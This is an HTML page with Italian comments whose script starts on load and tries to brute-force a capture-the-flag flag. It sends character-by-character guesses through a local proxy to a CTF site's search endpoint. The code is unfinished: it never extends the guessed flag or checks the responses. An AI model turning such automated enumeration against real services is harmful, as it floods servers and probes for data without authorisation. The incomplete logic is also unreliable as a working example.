<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Brute Force Flag</title>
    <script>
        const proxyUrl = 'http://127.0.0.1:5000/proxy?url='; // Modifica l'URL secondo il tuo server Flask

        async function search(flag) {
            try {
                const response = await fetch(proxyUrl + encodeURIComponent(`https://matrix.capturetheflags.site/search?s=${flag}`), {
                    method: 'GET'
                });
                
                if (response.ok) {
                    const result = await response.json();
                    console.log('Risultato della ricerca:', result);
                    // Controlla qui se la risposta contiene la flag
                } else {
                    console.error('Errore nella richiesta:', response.status);
                }
            } catch (error) {
                console.error('Errore nella richiesta:', error);
            }
        }

        async function bruteForceFlag() {
            const charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}'; // Include caratteri speciali e maiuscole
            const flagPrefix = 'flag{'; // Inizia con flag{
            const flagLength = 32; // Lunghezza della flag attesa
            let flag = flagPrefix;

            for (let i = 0; i < flagLength - flagPrefix.length - 1; i++) {
                for (const char of charset) {
                    const testFlag = flag + char;
                    await search(testFlag);
                    // Aggiungi una pausa tra le richieste per non sovraccaricare il server
                    await new Promise(r => setTimeout(r, 100)); // 100 ms
                }
                // A questo punto, dovresti controllare la risposta per vedere se hai trovato la flag
            }
        }

        window.onload = function() {
            bruteForceFlag();
        };
    </script>
</head>
<body>
    <h1>Brute Force Flag</h1>
    <p>Controlla la console per vedere i risultati.</p>
</body>
</html>
